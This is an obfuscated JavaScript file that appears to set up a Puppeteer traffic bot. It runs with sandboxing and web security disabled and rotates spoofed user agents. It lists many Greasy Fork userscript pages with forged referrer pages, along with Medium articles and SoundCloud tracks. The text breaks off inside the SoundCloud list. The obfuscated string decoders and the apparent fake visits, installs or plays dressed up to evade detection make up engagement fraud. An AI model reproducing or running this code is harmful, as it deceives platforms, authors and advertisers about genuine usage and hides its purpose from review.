function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1fa0 + 0x1351 + 0xc4f);
    let h = e[f];
    return h;
  }, d(b, c);
}
const a1 = d,
  a0 = c,
  Z = b;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (-0x2121 + 0x5 * 0x2bd + -0x2c7 * -0x7))) + h;
}
async function randomWait() {
  return await wait(-0x19ac + -0xd * -0x298 + 0x1a4 * 0x7 + (-0x1141 + -0x1 * -0x1fd3 + 0x4f6 * 0x1) * random()), 0x2691 + -0x14dc + -0x67 * 0x2c;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1fa0 + 0x1351 + 0xc4f);
    let h = e[f];
    if (b['hMqatR'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x19d * -0x6 + -0x1546 + -0x6a * -0x1c, s, t, u = -0x1c1 + 0x989 * -0x1 + 0xb4a; t = n['charAt'](u++); ~t && (s = r % (-0x2121 + 0x5 * 0x2bd + -0x33e * -0x6) ? s * (-0x19ac + -0xd * -0x298 + 0x3e6 * -0x2) + t : t, r++ % (-0x1141 + -0x1 * -0x1fd3 + 0xe8e * -0x1)) ? p += String['fromCharCode'](0x2691 + -0x14dc + -0x5d * 0x2e & s >> (-(0x4b * 0x4a + 0x1e * -0x31 + -0xfee) * r & -0x2 * -0xf94 + -0x16a0 + 0x2 * -0x441)) : -0x5 * 0xa3 + 0x647 + -0x318) {
          t = o['indexOf'](t);
        }
        for (let v = -0x13 * -0x12 + -0x155c + -0x1406 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x355 * -0x2 + -0x22a4 + 0x1c0a))['slice'](-(-0x114e * -0x2 + 0xcd1 * 0x1 + 0x3d * -0xc7));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1b * 0x16b + 0xc38 + 0x1 * 0x1a11,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1a82 + -0xffd * -0x2 + 0x1 * -0x3a7c; u < -0x1cd * 0x5 + 0xad6 + 0x1 * -0xd5; u++) {
          p[u] = u;
        }
        for (u = -0x22cd + -0x23 * -0x32 + 0x1bf7; u < -0x255 + -0x1 * 0x252d + -0xa * -0x40d; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xf8f + 0x105 * -0x25 + 0xd92 * 0x4), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x85f * -0x3 + 0x1b5c + -0x3479, q = -0x1a61 + 0x2638 + -0xbd7;
        for (let v = 0x10cb + 0x195b + -0xa * 0x437; v < n['length']; v++) {
          u = (u + (0x243 * 0x6 + -0x1154 + -0x6b * -0x9)) % (0x15be * -0x1 + 0x6eb + 0xfd3), q = (q + p[u]) % (-0x1efa + 0xc * -0x336 + 0x4682), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x116c + 0xa9 * 0x20 + -0x15a * 0x2)]);
        }
        return t;
      };
      b['hjbAow'] = m, c = arguments, b['hMqatR'] = !![];
    }
    const j = e[0x1db1 + -0xa77 * 0x2 + 0x8c3 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['RhaFyy'] === undefined && (b['RhaFyy'] = !![]), h = b['hjbAow'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_GF': 0x1,
    'RPL2_SC2': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x0,
    'RPL2_RPRT': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math,
  NETWORK_PATIENCE = 0x2bd * 0x13 + 0x1 * -0xdc7 + 0x8a0 + (-0x2 * -0xf94 + -0x16a0 + 0x2 * 0x198) * random(),
  MM_NETWORK_PATIENCE = (-0x5 * 0xa3 + 0x647 + -0x315) * NETWORK_PATIENCE,
  me = random()['toString'](-0x13 * -0x12 + -0x155c + -0x1416 * -0x1)['substring'](-0x355 * -0x2 + -0x22a4 + 0x1bfe, -0x114e * -0x2 + 0xcd1 * 0x1 + 0x7 * -0x6c5),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + Z(0x2, 'kpxX'),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x7) + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': a0(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + Z(0x6, '5!]4') + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + a1(0xb) + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0xe) + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x1) + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + a0(0x3) + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a0(0xa) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      a1(0x8) + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      a1(0x8) + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
